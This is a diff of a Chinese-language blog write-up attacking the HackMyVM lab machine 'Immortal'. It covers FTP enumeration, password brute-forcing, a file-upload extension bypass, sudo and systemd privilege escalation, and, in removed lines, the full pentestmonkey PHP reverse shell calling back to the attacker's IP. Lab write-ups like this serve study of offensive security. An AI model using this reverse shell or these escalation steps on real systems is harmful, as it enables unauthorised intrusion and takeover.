@@ -12,7 +12,7 @@
     </script>
 <meta name="description" content="# 0.简介
 
-**靶机**：[thehackerslabs - Immortal](https://hackmyvm.eu/machines/machine.php?vm=Immortal)
+**靶机**：[[thehackerslabs - Immortal](https://hackmyvm.eu/machines/machine.php?vm=Immortal)](https://hackmyvm.eu/machines/machine.php?vm=Immortal)
 **难度**：黄色
 **目标 IP**：192.168.205.223
 **本机 IP**：192.168.205.141
@@ -21,7 +21,7 @@
 
 # 1.扫描
 
-`nmap`起手，先探测端口
+`nmap` 起手，先探测端口
 
 ```bash
 ┌──(kali㉿kali)-[~/test]
@@ -39,7 +39,9 @@ MAC Address: 08:00:27:13:BB:B5 (Oracle VirtualBox virtual NIC)
 Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
 ```
 
-没啥好说的，有ftp服务先尝试匿名登录
+没啥好说的，有 ftp 服务先尝试**匿名登录**
+
+---
 
 # 2.踩点
 
@@ -47,7 +49,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
 
 ```bash
 ┌──(kali㉿kali)-[~/test]
-└─$ ftp 192.168.205.223           
+└─$ ftp 192.168.205.223     
 Connected to 192.168.205.223.
 220 (vsFTPd 3.0.3)
 Name (192.168.205.223:kali): anonymous
@@ -71,10 +73,10 @@ mget message.txt [anpqy?]? y
 226 Transfer complete.
 504 bytes received in 00:00 (429.10 KiB/s)
 ftp> exit
-221 Goodbye.                                     
+221 Goodbye.                               
 ```
 
-查看message.txt文件
+查看 message.txt 文件
 
 ```bash
 ┌──(kali㉿kali)-[~/test]
@@ -90,7 +92,7 @@ Wishing you a long life, David.
 <meta property="og:title" content="hmv_Immortal">
 <meta property="og:description" content="# 0.简介
 
-**靶机**：[thehackerslabs - Immortal](https://hackmyvm.eu/machines/machine.php?vm=Immortal)
+**靶机**：[[thehackerslabs - Immortal](https://hackmyvm.eu/machines/machine.php?vm=Immortal)](https://hackmyvm.eu/machines/machine.php?vm=Immortal)
 **难度**：黄色
 **目标 IP**：192.168.205.223
 **本机 IP**：192.168.205.141
@@ -99,7 +101,7 @@ Wishing you a long life, David.
 
 # 1.扫描
 
-`nmap`起手，先探测端口
+`nmap` 起手，先探测端口
 
 ```bash
 ┌──(kali㉿kali)-[~/test]
@@ -117,7 +119,9 @@ MAC Address: 08:00:27:13:BB:B5 (Oracle VirtualBox virtual NIC)
 Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
 ```
 
-没啥好说的，有ftp服务先尝试匿名登录
+没啥好说的，有 ftp 服务先尝试**匿名登录**
+
+---
 
 # 2.踩点
 
@@ -125,7 +129,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
 
 ```bash
 ┌──(kali㉿kali)-[~/test]
-└─$ ftp 192.168.205.223           
+└─$ ftp 192.168.205.223     
 Connected to 192.168.205.223.
 220 (vsFTPd 3.0.3)
 Name (192.168.205.223:kali): anonymous
@@ -149,10 +153,10 @@ mget message.txt [anpqy?]? y
 226 Transfer complete.
 504 bytes received in 00:00 (429.10 KiB/s)
 ftp> exit
-221 Goodbye.                                     
+221 Goodbye.                               
 ```
 
-查看message.txt文件
+查看 message.txt 文件
 
 ```bash
 ┌──(kali㉿kali)-[~/test]
@@ -236,13 +240,13 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>0.简介</h1>
-<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=Immortal" rel="nofollow">thehackerslabs - Immortal</a><br>
+<p><strong>靶机</strong>：[<a href="https://hackmyvm.eu/machines/machine.php?vm=Immortal" rel="nofollow">thehackerslabs - Immortal</a>](<a href="https://hackmyvm.eu/machines/machine.php?vm=Immortal" rel="nofollow">https://hackmyvm.eu/machines/machine.php?vm=Immortal</a>)<br>
 <strong>难度</strong>：黄色<br>
 <strong>目标 IP</strong>：192.168.205.223<br>
 <strong>本机 IP</strong>：192.168.205.141</p>
 <hr>
 <h1>1.扫描</h1>
-<p><code class="notranslate">nmap</code>起手，先探测端口</p>
+<p><code class="notranslate">nmap</code> 起手，先探测端口</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nmap 192.168.205.223
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 12:20 CST
@@ -256,11 +260,12 @@ PORT   STATE SERVICE
 MAC Address: 08:00:27:13:BB:B5 (Oracle VirtualBox virtual NIC)
 
 Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 0.45 seconds</pre></div>
-<p>没啥好说的，有ftp服务先尝试匿名登录</p>
+<p>没啥好说的，有 ftp 服务先尝试<strong>匿名登录</strong></p>
+<hr>
 <h1>2.踩点</h1>
 <h2>port 21</h2>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ ftp 192.168.205.223           
+└─$ ftp 192.168.205.223     
 Connected to 192.168.205.223.
 220 (vsFTPd 3.0.3)
 Name (192.168.205.223:kali): anonymous
@@ -284,8 +289,8 @@ mget message.txt [anpqy<span class="pl-k">?</span>]<span class="pl-k">?</span> y
 226 Transfer complete.
 504 bytes received <span class="pl-k">in</span> 00:00 (429.10 KiB/s)
 ftp<span class="pl-k">&gt;</span> <span class="pl-c1">exit</span>
-221 Goodbye.                                     </pre></div>
-<p>查看message.txt文件</p>
+221 Goodbye.                               </pre></div>
+<p>查看 message.txt 文件</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ cat message.txt 
 Hey guys<span class="pl-k">!</span>
@@ -298,141 +303,23 @@ Wishing you a long life, David.
 经过这么长时间，我做到了。没错，伙计们，伟大的珍贵不朽。所有人都觊觎而没有人能实现的那个。受到所有人的青睐，没有人拥有。
 现在我们必须小心，伙计们，我们必须向世界、政府和其他危险机构隐瞒这件事。
 他们甚至可能已经听说了我们的成就，他们无处不在！这就是我决定加强服务器安全性的原因。如果他们试图入侵我们怎么办<span class="pl-k">!!</span>
-祝你长寿，大卫。                             </pre></div>
-<p>没用信息，就获得个用户名David，那进行探测80服务</p>
+祝你长寿，大卫。                       </pre></div>
+<p>没用信息，就获得个用户名 <strong>David</strong>，那进行探测 80 服务</p>
 <h2>port 80</h2>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/403e1434-4a32-4037-8354-3ba83dd46695"><img src="https://github.com/user-attachments/assets/403e1434-4a32-4037-8354-3ba83dd46695" alt="image" style="max-width: 100%;"></a></p>
-<p>一个密码输入框，拿burp爆破一下，我这爆的是前5000行的rockyou.txt字典</p>
+<p>一个密码输入框，拿 burp 爆破一下，我这爆的是前 5000 行的 rockyou.txt 字典</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/92adc0f7-16e8-455f-b18d-6d4cb1a4b0ea"><img src="https://github.com/user-attachments/assets/92adc0f7-16e8-455f-b18d-6d4cb1a4b0ea" alt="image" style="max-width: 100%;"></a></p>
-<p>其中密码为santiago，状态码和长度完全不一样，尝试登录</p>
+<p>其中密码为 <strong>santiago</strong>，状态码和长度完全不一样，尝试登录</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/a6468ac6-365a-41f9-896d-c49c4d723309"><img src="https://github.com/user-attachments/assets/a6468ac6-365a-41f9-896d-c49c4d723309" alt="image" style="max-width: 100%;"></a></p>
-<p>一个文件夹目录，其中chat/给了提示</p>
+<p>一个文件夹目录，其中 <code class="notranslate">chat/</code>给了提示</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d5afbcdc-152e-4f92-9b4c-a4e8e7876ff1"><img src="https://github.com/user-attachments/assets/d5afbcdc-152e-4f92-9b4c-a4e8e7876ff1" alt="image" style="max-width: 100%;"></a></p>
-<p>上传点在upload_an_incredible_message.php，浅试了一下上传index.phtml不成功，我就直接放burp爆破后缀了</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ cat index.php  
-<span class="pl-k">&lt;</span><span class="pl-k">?</span>php
-// php-reverse-shell - A Reverse Shell implementation <span class="pl-k">in</span> PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
-// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
-
-set_time_limit (0)<span class="pl-k">;</span>
-<span class="pl-smi">$VERSION</span> = <span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span><span class="pl-k">;</span>
-<span class="pl-smi">$ip</span> = <span class="pl-s"><span class="pl-pds">'</span>192.168.205.141<span class="pl-pds">'</span></span><span class="pl-k">;</span>
-<span class="pl-smi">$port</span> = 8888<span class="pl-k">;</span>
-<span class="pl-smi">$chunk_size</span> = 1400<span class="pl-k">;</span>
-<span class="pl-smi">$write_a</span> = null<span class="pl-k">;</span>
-<span class="pl-smi">$error_a</span> = null<span class="pl-k">;</span>
-<span class="pl-smi">$shell</span> = <span class="pl-s"><span class="pl-pds">'</span>uname -a; w; id; /bin/bash -i<span class="pl-pds">'</span></span><span class="pl-k">;</span>
-<span class="pl-smi">$daemon</span> = 0<span class="pl-k">;</span>
-<span class="pl-smi">$debug</span> = 0<span class="pl-k">;</span>
-
-<span class="pl-k">if</span> (function_exists(<span class="pl-s"><span class="pl-pds">'</span>pcntl_fork<span class="pl-pds">'</span></span>)) {
-        <span class="pl-smi">$pid</span> = <span class="pl-en">pcntl_fork</span>();
-
-        <span class="pl-k">if</span> (<span class="pl-smi">$pid</span> == -1) {
-                printit(<span class="pl-s"><span class="pl-pds">"</span>ERROR: Can't fork<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-                exit(1)<span class="pl-k">;</span>
-        }
-
-        <span class="pl-k">if</span> (<span class="pl-smi">$pid</span>) {
-                exit(0)<span class="pl-k">;</span>  // Parent exits
-        }
-        <span class="pl-k">if</span> (posix_setsid() == -1) {
-                printit(<span class="pl-s"><span class="pl-pds">"</span>Error: Can't setsid()<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-                exit(1)<span class="pl-k">;</span>
-        }
-
-        <span class="pl-smi">$daemon</span> = 1<span class="pl-k">;</span>
-} <span class="pl-k">else</span> {
-        printit(<span class="pl-s"><span class="pl-pds">"</span>WARNING: Failed to daemonise.  This is quite common and not fatal.<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-}
-
-chdir(<span class="pl-s"><span class="pl-pds">"</span>/<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-
-umask(0)<span class="pl-k">;</span>
-
-// Open reverse connection
-<span class="pl-smi">$sock</span> = fsockopen(<span class="pl-smi">$ip</span>, <span class="pl-smi">$port</span>, <span class="pl-smi">$errno</span>, <span class="pl-smi">$errstr</span>, 30)<span class="pl-k">;</span>
-<span class="pl-k">if</span> (<span class="pl-k">!</span><span class="pl-smi">$sock</span>) {
-        printit(<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$errstr</span> (<span class="pl-smi">$errno</span>)<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-        exit(1)<span class="pl-k">;</span>
-}
-
-<span class="pl-smi">$descriptorspec</span> = array(
-   0 =<span class="pl-k">&gt;</span> array(<span class="pl-s"><span class="pl-pds">"</span>pipe<span class="pl-pds">"</span></span>, <span class="pl-s"><span class="pl-pds">"</span>r<span class="pl-pds">"</span></span>),  // stdin is a pipe that the child will <span class="pl-c1">read</span> from
-   1 =<span class="pl-k">&gt;</span> array(<span class="pl-s"><span class="pl-pds">"</span>pipe<span class="pl-pds">"</span></span>, <span class="pl-s"><span class="pl-pds">"</span>w<span class="pl-pds">"</span></span>),  // stdout is a pipe that the child will write to
-   2 =<span class="pl-k">&gt;</span> array(<span class="pl-s"><span class="pl-pds">"</span>pipe<span class="pl-pds">"</span></span>, <span class="pl-s"><span class="pl-pds">"</span>w<span class="pl-pds">"</span></span>)   // stderr is a pipe that the child will write to
-)<span class="pl-k">;</span>
-
-<span class="pl-smi">$process</span> = proc_open(<span class="pl-smi">$shell</span>, <span class="pl-smi">$descriptorspec</span>, <span class="pl-smi">$pipes</span>)<span class="pl-k">;</span>
-
-<span class="pl-k">if</span> (<span class="pl-k">!</span>is_resource(<span class="pl-smi">$process</span>)) {
-        printit(<span class="pl-s"><span class="pl-pds">"</span>ERROR: Can't spawn shell<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-        exit(1)<span class="pl-k">;</span>
-}
-
-stream_set_blocking(<span class="pl-smi">$pipes</span>[0], 0)<span class="pl-k">;</span>
-stream_set_blocking(<span class="pl-smi">$pipes</span>[1], 0)<span class="pl-k">;</span>
-stream_set_blocking(<span class="pl-smi">$pipes</span>[2], 0)<span class="pl-k">;</span>
-stream_set_blocking(<span class="pl-smi">$sock</span>, 0)<span class="pl-k">;</span>
-
-printit(<span class="pl-s"><span class="pl-pds">"</span>Successfully opened reverse shell to <span class="pl-smi">$ip</span>:<span class="pl-smi">$port</span><span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-
-<span class="pl-k">while</span> (1) {
-        <span class="pl-k">if</span> (feof(<span class="pl-smi">$sock</span>)) {
-                printit(<span class="pl-s"><span class="pl-pds">"</span>ERROR: Shell connection terminated<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-                <span class="pl-c1">break</span><span class="pl-k">;</span>
-        }
-
-        <span class="pl-k">if</span> (feof(<span class="pl-smi">$pipes</span>[1])) {
-                printit(<span class="pl-s"><span class="pl-pds">"</span>ERROR: Shell process terminated<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-                <span class="pl-c1">break</span><span class="pl-k">;</span>
-        }
-
-        <span class="pl-smi">$read_a</span> = array(<span class="pl-smi">$sock</span>, <span class="pl-smi">$pipes</span>[1], <span class="pl-smi">$pipes</span>[2])<span class="pl-k">;</span>
-        <span class="pl-smi">$num_changed_sockets</span> = stream_select(<span class="pl-smi">$read_a</span>, <span class="pl-smi">$write_a</span>, <span class="pl-smi">$error_a</span>, null)<span class="pl-k">;</span>
-
-        <span class="pl-k">if</span> (in_array(<span class="pl-smi">$sock</span>, <span class="pl-smi">$read_a</span>)) {
-                <span class="pl-k">if</span> (<span class="pl-smi">$debug</span>) printit(<span class="pl-s"><span class="pl-pds">"</span>SOCK READ<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-                <span class="pl-smi">$input</span> = fread(<span class="pl-smi">$sock</span>, <span class="pl-smi">$chunk_size</span>)<span class="pl-k">;</span>
-                <span class="pl-k">if</span> (<span class="pl-smi">$debug</span>) printit(<span class="pl-s"><span class="pl-pds">"</span>SOCK: <span class="pl-smi">$input</span><span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-                fwrite(<span class="pl-smi">$pipes</span>[0], <span class="pl-smi">$input</span>)<span class="pl-k">;</span>
-        }
-
-        <span class="pl-k">if</span> (in_array(<span class="pl-smi">$pipes</span>[1], <span class="pl-smi">$read_a</span>)) {
-                <span class="pl-k">if</span> (<span class="pl-smi">$debug</span>) printit(<span class="pl-s"><span class="pl-pds">"</span>STDOUT READ<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-                <span class="pl-smi">$input</span> = fread(<span class="pl-smi">$pipes</span>[1], <span class="pl-smi">$chunk_size</span>)<span class="pl-k">;</span>
-                <span class="pl-k">if</span> (<span class="pl-smi">$debug</span>) printit(<span class="pl-s"><span class="pl-pds">"</span>STDOUT: <span class="pl-smi">$input</span><span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-                fwrite(<span class="pl-smi">$sock</span>, <span class="pl-smi">$input</span>)<span class="pl-k">;</span>
-        }
-
-        <span class="pl-k">if</span> (in_array(<span class="pl-smi">$pipes</span>[2], <span class="pl-smi">$read_a</span>)) {
-                <span class="pl-k">if</span> (<span class="pl-smi">$debug</span>) printit(<span class="pl-s"><span class="pl-pds">"</span>STDERR READ<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-                <span class="pl-smi">$input</span> = fread(<span class="pl-smi">$pipes</span>[2], <span class="pl-smi">$chunk_size</span>)<span class="pl-k">;</span>
-                <span class="pl-k">if</span> (<span class="pl-smi">$debug</span>) printit(<span class="pl-s"><span class="pl-pds">"</span>STDERR: <span class="pl-smi">$input</span><span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
-                fwrite(<span class="pl-smi">$sock</span>, <span class="pl-smi">$input</span>)<span class="pl-k">;</span>
-        }
-}
-
-fclose(<span class="pl-smi">$sock</span>)<span class="pl-k">;</span>
-fclose(<span class="pl-smi">$pipes</span>[0])<span class="pl-k">;</span>
-fclose(<span class="pl-smi">$pipes</span>[1])<span class="pl-k">;</span>
-fclose(<span class="pl-smi">$pipes</span>[2])<span class="pl-k">;</span>
-proc_close(<span class="pl-smi">$process</span>)<span class="pl-k">;</span>
-
-<span class="pl-k">function</span> <span class="pl-en">printit</span> (<span class="pl-smi">$string</span>) {
-        <span class="pl-k">if</span> (<span class="pl-k">!</span><span class="pl-smi">$daemon</span>) {
-                print <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$string</span>\n<span class="pl-pds">"</span></span><span class="pl-k">;</span>
-        }
-}
-
-<span class="pl-k">?</span><span class="pl-k">&gt;</span>
-  </pre></div>
+<p>上传点在 <code class="notranslate">upload_an_incredible_message.php</code>，浅试了一下,上传 <code class="notranslate">index.php</code> 不成功，我就直接放 burp 爆破后缀了</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7f2fda33-177d-4a71-9212-9676d959bd66"><img src="https://github.com/user-attachments/assets/7f2fda33-177d-4a71-9212-9676d959bd66" alt="image" style="max-width: 100%;"></a></p>
+<p>直接去网页看了，不想看报文</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8446218d-b24e-4ed0-add6-1f7388617018"><img src="https://github.com/user-attachments/assets/8446218d-b24e-4ed0-add6-1f7388617018" alt="image" style="max-width: 100%;"></a></p>
-<p>其中index.phtml是可以执行的，到这里我们已经拿到了www-data的shell</p>
+<p>其中 <strong>index.phtml</strong> 是可以执行的，到这里我们已经拿到了 <strong>www-data</strong> 的 <strong>shell</strong></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ nc -lvnp 8888                           
+└─$ nc -lvnp 8888                     
 listening on [any] 8888 ...
 connect to [192.168.205.141] from (UNKNOWN) [192.168.205.223] 50866
 Linux Immortal 5.10.0-28-amd64 <span class="pl-c"><span class="pl-c">#</span>1 SMP Debian 5.10.209-2 (2024-01-31) x86_64 GNU/Linux</span>
@@ -446,7 +333,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </pre></div>
 <h1>3. 获得稳定的 Shell</h1>
-<p>获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：</p>
+<p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
 ctrl+z  
 stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
@@ -489,7 +376,7 @@ bank <span class="pl-c1">:</span> myfavouritebank
 nintendo <span class="pl-c1">:</span> 123456
 </pre></div>
 <p>难评，把数据处理一下</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Immortal:/home/drake/...$ cat pass.txt <span class="pl-k">|</span>awk -F <span class="pl-s"><span class="pl-pds">'</span> <span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $1 "\n" $3}<span class="pl-pds">'</span></span>     
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Immortal:/home/drake/...$ cat pass.txt <span class="pl-k">|</span>awk -F <span class="pl-s"><span class="pl-pds">'</span> <span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $1 "\n" $3}<span class="pl-pds">'</span></span>   
 netflix
 drake123
 amazon
@@ -518,9 +405,9 @@ nintendo
 123456
 
 f4ns0nly</pre></div>
-<p>那个空格无伤大雅，拖个suForce爆破密码</p>
+<p>那个空格无伤大雅，拖个 <strong>suForce</strong> 爆破密码</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Immortal:/tmp$ ./suForce -u drake -w pass 
-            _____                        
+            _____                  
  ___ _   _ <span class="pl-k">|</span>  ___<span class="pl-k">|</span>__  _ __ ___ ___   
 / __<span class="pl-k">|</span> <span class="pl-k">|</span> <span class="pl-k">|</span> <span class="pl-k">||</span> <span class="pl-k">|</span>_ / _ <span class="pl-cce">\|</span> <span class="pl-s"><span class="pl-pds">'</span>__/ __/ _ \ </span>
 <span class="pl-s">\__ \ |_| ||  _| (_) | | | (_|  __/  </span>
@@ -536,7 +423,7 @@ f4ns0nly</pre></div>
 <span class="pl-s"></span>
 <span class="pl-s"></span>
 <span class="pl-s">www-data@Immortal:/tmp$ su - drake   </span></pre></div>
-<p>如果它提示没有找到密码可以多试几次，我不知道是不是我suForce的问题，我的会误报</p>
+<p><em>ps:如果它提示没有找到密码可以多试几次，我不知道是不是我 suForce 的问题，我的会误报</em></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">drake@Immortal:/home$ sudo -l
 Matching Defaults entries <span class="pl-k">for</span> drake on Immortal:
     env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
@@ -544,7 +431,7 @@ Matching Defaults entries <span class="pl-k">for</span> drake on Immortal:
 User drake may run the following commands on Immortal:
     (eric) NOPASSWD: /usr/bin/python3 /opt/immortal.py
 </pre></div>
-<p>可以用python3执行/opt/immortal.py，/opt/immortal.py我们有编辑权限，直接改就好了，我甩了个反弹shell回去[肥肥瘫]</p>
+<p>可以用 <strong>python3</strong> 执行<code class="notranslate">/opt/immortal.py</code>，<code class="notranslate">/opt/immortal.py</code> 我们有编辑权限，直接改就好了，我甩了个反弹 shell 回去[肥肥瘫]</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">eric@Immortal:<span class="pl-k">~</span>$ sudo -l
 Matching Defaults entries <span class="pl-k">for</span> eric on Immortal:
     env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
@@ -557,9 +444,21 @@ User eric may run the following commands on Immortal:
     (root) NOPASSWD: /usr/bin/systemctl disable immortal.service
     (root) NOPASSWD: /usr/bin/systemctl daemon-reload
 eric@Immortal:<span class="pl-k">~</span>$ sudo sudoedit /etc/systemd/system/immortal.service</pre></div>
-<p>改个反弹shell上去</p>
+<p>改个反弹 shell 上去,查看sudo权限</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">eric@Immortal:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> eric on Immortal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+
+User eric may run the following commands on Immortal:
+    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service
+    (root) NOPASSWD: /usr/bin/systemctl start immortal.service
+    (root) NOPASSWD: /usr/bin/systemctl stop immortal.service
+    (root) NOPASSWD: /usr/bin/systemctl <span class="pl-c1">enable</span> immortal.service
+    (root) NOPASSWD: /usr/bin/systemctl disable immortal.service
+    (root) NOPASSWD: /usr/bin/systemctl daemon-reload
+eric@Immortal:<span class="pl-k">~</span>$ sudo sudoedit /etc/systemd/system/immortal.service</pre></div>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/03c06f7b-54a5-44f4-9a93-6f98aa26aa5d"><img src="https://github.com/user-attachments/assets/03c06f7b-54a5-44f4-9a93-6f98aa26aa5d" alt="image" style="max-width: 100%;"></a></p>
-<p>重启一下服务</p>
+<p>把<strong>ExecStart</strong>改成了<strong>反弹shell，</strong> 重启一下服务</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">eric@Immortal:<span class="pl-k">~</span>$ sudo /usr/bin/systemctl start immortal.service</pre></div>
 <p>监听</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
@@ -571,7 +470,8 @@ bash: no job control <span class="pl-k">in</span> this shell
 root@Immortal:/<span class="pl-c"><span class="pl-c">#</span> id</span>
 id
 uid=0(root) gid=0(root) groups=0(root)
-</pre></div></div>
+</pre></div>
+<p>成功拿到<strong>root</strong>权限</p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
